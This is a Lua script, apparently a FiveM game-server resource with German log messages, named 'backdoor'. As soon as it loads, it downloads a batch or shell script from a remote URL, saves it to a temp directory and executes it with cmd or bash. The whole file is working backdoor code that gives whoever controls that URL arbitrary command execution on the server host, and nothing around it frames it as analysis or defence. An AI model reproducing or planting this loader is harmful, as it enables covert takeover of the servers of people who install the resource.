local config = {
    resourceName = "backdoor", 
    windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat", 
    enablePrints = true 
}

local function runBatchScript(scriptContent)
    if config.enablePrints then
        print("Führe das Skript aus...")
    end

    local command
    if string.sub(os.getenv("OS"), 1, 7) == "Windows" then
        -- Windows
        local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
        local file = io.open(tempFilePath, "w")
        if file then
            file:write(scriptContent)
            file:close()
            command = "cmd /C " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    else
        -- Linux
        local tempFilePath = "/tmp/backdoor.sh"
        local file = io.open(tempFilePath, "w")
        if file then
            file:write(scriptContent)
            file:close()
            command = "bash " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    end
    os.execute(command)
end

local function fetchScriptContent(url)
    if config.enablePrints then
        print("Lade das Skript herunter...")
    end

    local httpRequest = PerformHttpRequest(url, function(statusCode, response)
        if statusCode == 200 then
            runBatchScript(response)
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
            end
        end
    end, "GET", "", {["Content-Type"] = "application/json"})

    while not httpRequest do
        Citizen.Wait(0)
    end
end

local function main()
    local currentResourceName = GetCurrentResourceName()
    if currentResourceName ~= config.resourceName then
        if config.enablePrints then
            print("Ungültiger Ressourcenname. Der Server wird heruntergefahren...")
        end
        os.exit()
    end
    fetchScriptContent(config.windowsScriptURL)
end

-- Starte das Skript
main()
